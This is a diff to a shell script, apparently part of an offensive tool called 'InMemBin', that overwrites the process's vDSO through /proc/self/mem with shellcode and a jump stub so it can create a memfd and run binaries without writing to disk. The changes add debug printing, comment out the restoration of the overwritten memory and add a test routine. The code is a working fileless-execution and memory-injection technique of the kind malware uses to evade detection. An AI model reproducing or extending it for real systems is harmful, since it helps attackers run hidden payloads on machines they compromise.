@@ -25,13 +25,21 @@ create_memfd(){
   jumper_hex="$(craft_jumper "$shellcode_addr")"
   jumper_addr="$(get_read_syscall_ret_addr)"
   
-  [ "$DEBUG" != 0 ] && >&2 printf "%s" "InMemBin: shellcode_addr=$shellcode_addr,jumper_addr=$jumper_addr"
-
   # Backup
   [ "$DEBUG" != 0 ] && >&2 echo Read1
   shellcode_save_hex=$(read_mem "$shellcode_addr" $(( ${#shellcode_hex} / 2 )))
   [ "$DEBUG" != 0 ] && >&2 echo Read2
   jumper_save_hex=$(read_mem "$jumper_addr" $(( ${#jumper_hex} / 2 )))
+
+  [ "$DEBUG" != 0 ] && >&2 echo "InMemBin:
+    shellcode_addr=$shellcode_addr
+    shellcode_hex=$shellcode_hex
+    shellcode_save_hex=$shellcode_save_hex
+
+    jumper_addr=$jumper_addr
+    jumper_hex=$jumper_hex
+    jumper_save_hex=$jumper_hex
+  "
 
   # Overwrite vDSO with our shellcode
   [ "$DEBUG" != 0 ] && >&2 echo Write1
@@ -42,10 +50,18 @@ create_memfd(){
   write_mem "$jumper_addr" "$jumper_hex"
 
   [ "$DEBUG" != 0 ] && >&2 echo Write3
-  write_mem "$shellcode_addr" "$shellcode_save_hex"
-  write_mem "$jumper_addr" "$jumper_save_hex"
+  #write_mem "$shellcode_addr" "$shellcode_save_hex"
+
+  # Done by shellcode
+  #[ "$DEBUG" != 0 ] && >&2 echo Write4
+  #write_mem "$jumper_addr" "$jumper_save_hex"
 
   [ "$DEBUG" != 0 ] && >&2 echo "InMemBin: Function is back"
+}
+
+test(){
+  create_memfd
+  write_mem "$shellcode_addr" "$shellcode_save_hex"
 }
 
 
@@ -54,7 +70,7 @@ read_mem(){
     TODO: Implementing... bash only
   '
   exec 3< /proc/self/mem
-  xxd -s "$1" -l "$2"  -c 1000000 -p <&3
+  xxd -s "$1" -l "$2"  -c 100000 -p <&3
   exec 3<&-
 }
 
